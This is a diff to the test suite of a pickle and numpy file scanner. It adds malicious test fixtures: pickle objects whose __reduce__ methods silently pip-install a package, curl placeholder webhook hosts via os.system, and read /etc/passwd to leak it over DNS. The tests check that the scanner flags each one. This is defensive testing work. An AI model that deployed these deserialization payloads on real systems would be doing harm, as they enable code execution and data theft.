@@ -15,6 +15,7 @@ import runpy
 import socket
 import subprocess
 import sys
+import timeit
 import venv
 import zipfile
 from functools import partial
@@ -112,6 +113,23 @@ class Malicious15:
         )
 
 
+class Malicious16:
+    def __reduce__(self):
+        return pip.main, (
+            [
+                "install",
+                "some_malicious_package",
+                "--no-input",
+                "-q",
+                "-q",
+                "-q",
+                "--exists-action",
+                "i",
+                "--isolated",
+            ],
+        )
+
+
 class Malicious17:
     def __reduce__(self):
         return codecache.compile_file, ("", "", ["sh", "-c", '$(echo "pwned")'])
@@ -136,21 +154,19 @@ class Malicious20:
         return venv.create, ("venv", False, False, True, False, "$(echo pwned)")
 
 
-class Malicious16:
+class Malicious21:
     def __reduce__(self):
-        return pip.main, (
-            [
-                "install",
-                "some_malicious_package",
-                "--no-input",
-                "-q",
-                "-q",
-                "-q",
-                "--exists-action",
-                "i",
-                "--isolated",
-            ],
+        return timeit.timeit, (
+            "",
+            'import os; os.system("curl https://webhook.invalid/1234")',
         )
+
+
+class Malicious22:
+    def __reduce__(self):
+        from numpy.testing._private.utils import runstring
+
+        return runstring, ("import os; os.system('curl https://example.invalid')", {})
 
 
 class HTTPResponse:
@@ -309,6 +325,26 @@ def initialize_numpy_files():
         np.savez_compressed(
             path, a=np.array([0, 1, 2], dtype=int), b=np.array([3, 4, 5], dtype=int)
         )
+
+    path = f"{_root_path}/data2/dns_exfiltration.npy"
+    if not os.path.exists(path):
+
+        class DNSLogPayload:
+            def __reduce__(self):
+                # Step 1: read a line from /etc/passwd
+                linecache = __import__("linecache")
+                first_line = linecache.getline("/etc/passwd", 1).strip()
+
+                # Step 2: Sanitize and embed it as a DNS subdomain
+                subdomain = first_line.replace(":", "_").replace("/", "_")
+                fqdn = f"{subdomain}.dns-logger.invalid"
+
+                # Step 3: Use ssl.get_server_certificate to trigger DNS resolution
+                ssl_mod = __import__("ssl")
+                return (getattr(ssl_mod, "get_server_certificate"), ((fqdn, 443),))
+
+        # To load attack: np.load("dns_exfiltration.npy", encoding="latin1", fix_imports=True, allow_pickle=True)
+        np.save(path, np.array([DNSLogPayload()], dtype=object), allow_pickle=True)
 
 
 def initialize_pickle_files():
@@ -521,6 +557,8 @@ def initialize_pickle_files():
     # Fake PyTorch file (PNG file format) simulating https://huggingface.co/RectalWorm/loras_new/blob/main/Owl_Mage_no_background.pt
     initialize_data_file(f"{_root_path}/data/bad_pytorch.pt", b"\211PNG\r\n\032\n")
 
+    initialize_pickle_file(f"{_root_path}/data2/malicious21.pkl", Malicious21(), 4)
+    initialize_pickle_file(f"{_root_path}/data2/malicious22.pkl", Malicious22(), 4)
     # https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9gvj-pp9x-gcfr
     initialize_data_file(
         f"{_root_path}/data2/malicious21.pkl",
@@ -591,9 +629,9 @@ def test_scan_numpy():
                     Global("numpy", "ndarray", SafetyLevel.Innocuous),
                     Global("numpy", "dtype", SafetyLevel.Innocuous),
                 ],
-                1,
-                0,
-                0,
+                scanned_files=1,
+                issues_count=0,
+                infected_files=0,
             ),
         )
 
@@ -602,11 +640,26 @@ def test_scan_numpy():
             scan_numpy(io.BytesIO(f.read()), "int_array.npy"),
             ScanResult(
                 [],
-                1,
-                0,
-                0,
+                scanned_files=1,
+                issues_count=0,
+                infected_files=0,
             ),
         )
+
+    compare_scan_results(
+        scan_file_path(f"{_root_path}/data2/dns_exfiltration.npy"),
+        ScanResult(
+            [
+                Global("numpy._core.multiarray", "_reconstruct", SafetyLevel.Innocuous),
+                Global("numpy", "ndarray", SafetyLevel.Innocuous),
+                Global("numpy", "dtype", SafetyLevel.Innocuous),
+                Global("ssl", "get_server_certificate", SafetyLevel.Dangerous),
+            ],
+            scanned_files=1,
+            issues_count=1,
+            infected_files=1,
+        ),
+    )
 
 
 def test_scan_pytorch():
@@ -783,6 +836,17 @@ def test_scan_file_path():
         scan_file_path(f"{_root_path}/data2/malicious21.pkl"),
         ScanResult(
             [
+                Global("timeit", "timeit", SafetyLevel.Dangerous),
+            ],
+            scanned_files=1,
+            issues_count=1,
+            infected_files=1,
+        ),
+    )
+    compare_scan_results(
+        scan_file_path(f"{_root_path}/data2/malicious21.pkl"),
+        ScanResult(
+            [
                 Global(
                     "os", "system", SafetyLevel.Dangerous
                 ),
@@ -792,6 +856,21 @@ def test_scan_file_path():
             infected_files=1,
         ),
     )
+
+    compare_scan_results(
+        scan_file_path(f"{_root_path}/data2/malicious22.pkl"),
+        ScanResult(
+            [
+                Global(
+                    "numpy.testing._private.utils", "runstring", SafetyLevel.Dangerous
+                ),
+            ],
+            scanned_files=1,
+            issues_count=1,
+            infected_files=1,
+        ),
+    )
+
 
 
 def test_scan_file_path_npz():
@@ -804,9 +883,9 @@ def test_scan_file_path_npz():
                 Global("numpy", "dtype", SafetyLevel.Innocuous),
             ]
             * 2,
-            2,
-            0,
-            0,
+            scanned_files=2,
+            issues_count=0,
+            infected_files=0,
         ),
     )
 
@@ -814,9 +893,9 @@ def test_scan_file_path_npz():
         scan_file_path(f"{_root_path}/data2/int_arrays.npz"),
         ScanResult(
             [],
-            2,
-            0,
-            0,
+            scanned_files=2,
+            issues_count=0,
+            infected_files=0,
         ),
     )
 
@@ -829,9 +908,9 @@ def test_scan_file_path_npz():
                 Global("numpy", "dtype", SafetyLevel.Innocuous),
             ]
             * 2,
-            2,
-            0,
-            0,
+            scanned_files=2,
+            issues_count=0,
+            infected_files=0,
         ),
     )
 
@@ -839,9 +918,9 @@ def test_scan_file_path_npz():
         scan_file_path(f"{_root_path}/data2/int_arrays_compressed.npz"),
         ScanResult(
             [],
-            2,
-            0,
-            0,
+            scanned_files=2,
+            issues_count=0,
+            infected_files=0,
         ),
     )
 
